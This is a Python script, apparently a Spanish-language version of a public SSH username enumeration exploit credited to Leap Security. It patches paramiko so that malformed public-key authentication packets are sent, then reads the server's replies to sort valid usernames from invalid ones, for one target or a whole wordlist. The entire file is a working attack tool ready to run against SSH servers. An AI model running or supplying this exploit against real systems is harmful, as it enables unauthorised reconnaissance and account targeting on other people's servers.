#!/usr/bin/env python3

import argparse, paramiko, socket, sys, os
from colorama import Fore, Style  # Importa Fore para colores y Style para restablecer el estilo de la consola

class InvalidUsername(Exception):
    pass

# Malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# Function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# Malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result = old_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# Call when username was invalid 
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# Assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# Print valid users found so far
def print_result(valid_users):
    if valid_users:
        print(f"{Fore.GREEN}Usuarios válidos:{Style.RESET_ALL}")
        for user in valid_users:
            print(f"{Fore.GREEN}{user}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}No se encontraron usuarios válidos.{Style.RESET_ALL}")

# Perform authentication with malicious packet and username
def check_user(username):
    try:
        sock = socket.socket()
        sock.connect((args.target, int(args.port)))
        transport = paramiko.transport.Transport(sock)
        transport.start_client(timeout=0.5)

    except paramiko.ssh_exception.SSHException:
        print(f'{Fore.RED}[!] Fallo al negociar el transporte SSH{Style.RESET_ALL}')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except paramiko.ssh_exception.AuthenticationException:
        print(f"{Fore.GREEN}[+] {username} es un usuario válido{Style.RESET_ALL}")
        return True
    except:
        print(f"{Fore.RED}[-] {username} es un usuario inválido{Style.RESET_ALL}")
        return False

# Check a list of usernames from a wordlist
def check_userlist(wordlist_path):
    if os.path.isfile(wordlist_path):
        valid_users = []
        with open(wordlist_path) as f:
            for line in f:
                username = line.rstrip()
                try:
                    if check_user(username):
                        valid_users.append(username)
                except KeyboardInterrupt:
                    print("Enumeración abortada por el usuario.")
                    break

        print_result(valid_users)
    else:
        print(f"{Fore.RED}El archivo {wordlist_path} no es una lista de usuarios válidos.{Style.RESET_ALL}")
        sys.exit(2)

# Remove paramiko logging
paramiko.util.log_to_file('/dev/null')

parser = argparse.ArgumentParser(description='Enumeración de Usuarios SSH por Leap Security (@LeapSecurity)')
parser.add_argument('target', help="Dirección IP del sistema objetivo")
parser.add_argument('-p', '--port', default=22, help="Establecer el puerto del servicio SSH")
parser.add_argument('-u', '--user', dest='username',  help="Nombre de usuario para verificar su validez.")
parser.add_argument('-w', '--wordlist', dest='wordlist', help="Lista de nombres de usuario")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if args.wordlist:
    check_userlist(args.wordlist)
elif args.username:
    check_user(args.username)
else:
    print("[-] Debe especificar un nombre de usuario o una lista de usuarios.\n")
    parser.print_help()
    sys.exit(1)
